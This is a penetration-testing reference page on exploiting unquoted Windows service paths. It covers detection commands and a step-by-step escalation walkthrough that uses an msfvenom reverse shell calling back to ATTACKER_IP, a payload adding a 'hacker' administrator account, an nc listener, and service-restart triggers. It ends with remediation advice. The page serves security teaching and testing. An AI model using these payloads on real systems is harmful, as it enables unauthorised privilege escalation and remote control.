---
title: 'Unquoted Service Paths'
description: 'Finding and exploiting unquoted Windows service paths for privilege escalation — detection, exploitation, and remediation.'
---

# Unquoted Service Paths

## The Vulnerability

When a Windows service's executable path contains **spaces** and is **not enclosed in quotes**, the Service Control Manager (SCM) parses the path ambiguously, trying to execute binaries at each space boundary.

### Example

Service path (unquoted): `C:\Program Files\My Custom App\Service Folder\service.exe`

Windows tries to execute in this order:

| Order | Path Attempted | Exploitable If... |
|:------|:--------------|:-----------------|
| 1 | `C:\Program.exe` | You can write to `C:\` |
| 2 | `C:\Program Files\My.exe` | You can write to `C:\Program Files\` |
| 3 | `C:\Program Files\My Custom.exe` | You can write to `C:\Program Files\My Custom App\` ← **most common** |
| 4 | `C:\Program Files\My Custom App\Service.exe` | You can write to `C:\Program Files\My Custom App\Service Folder\` |
| 5 | `C:\Program Files\My Custom App\Service Folder\service.exe` | ← intended binary |

---

## Finding Unquoted Paths

### WMIC (Classic Method)

```cmd
:: Find unquoted paths with spaces (exclude Windows system services)
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

### PowerShell

```powershell
Get-WmiObject win32_service | Where-Object {
    $_.PathName -notmatch '^"' -and
    $_.PathName -match ' ' -and
    $_.StartMode -ne 'Disabled'
} | Select-Object Name, PathName, StartName, StartMode
```

### PowerUp

```powershell
Import-Module .\PowerUp.ps1
Get-UnquotedService
```

### WinPEAS

WinPEAS automatically checks for unquoted service paths and highlights them.

---

## Exploitation

### Step 1: Verify Write Permissions

```cmd
:: Check who can write to the vulnerable directory
icacls "C:\Program Files\My Custom App"

:: Look for:
::   BUILTIN\Users:(OI)(CI)(M)      ← Modify = can write files
::   BUILTIN\Users:(OI)(CI)(W)      ← Write = can write files
::   Everyone:(OI)(CI)(M)           ← Very vulnerable
```

### Step 2: Generate Payload

```bash
# On attacker: create a reverse shell executable
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o Service.exe

# Or for adding a local admin (simpler)
msfvenom -p windows/exec CMD="net localgroup Administrators hacker /add" -f exe -o Service.exe
```

### Step 3: Place the Payload

```cmd
:: Copy payload to the exploitable path
:: (filename must match what SCM will try to execute)
copy C:\temp\Service.exe "C:\Program Files\My Custom App\Service.exe"
```

### Step 4: Trigger Execution

```cmd
:: Option A: Restart the service (if you have permission)
sc stop VulnService
sc start VulnService

:: Option B: Reboot the system (if service is Auto-start)
shutdown /r /t 0

:: Option C: Wait for scheduled reboot or service restart
```

### Step 5: Catch Shell / Verify

```bash
# On attacker
nc -lvnp 4444
```

### Step 6: Clean Up

```cmd
:: Remove your binary after escalation
del "C:\Program Files\My Custom App\Service.exe"
```

---

## Quick Reference

```cmd
:: Full one-liner workflow:
:: 1. Find unquoted paths
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows" | findstr /i /v """

:: 2. Check write permissions on each directory in the path
icacls "C:\Program Files\Vulnerable App\"

:: 3. Place payload and restart service
copy payload.exe "C:\Program Files\Vulnerable.exe"
sc stop VulnService && sc start VulnService
```

---

## Remediation (For Reports)

- Enclose all service paths in quotes in the registry
- Fix: `reg add "HKLM\SYSTEM\CurrentControlSet\Services\ServiceName" /v ImagePath /t REG_EXPAND_SZ /d "\"C:\Program Files\App\service.exe\"" /f`
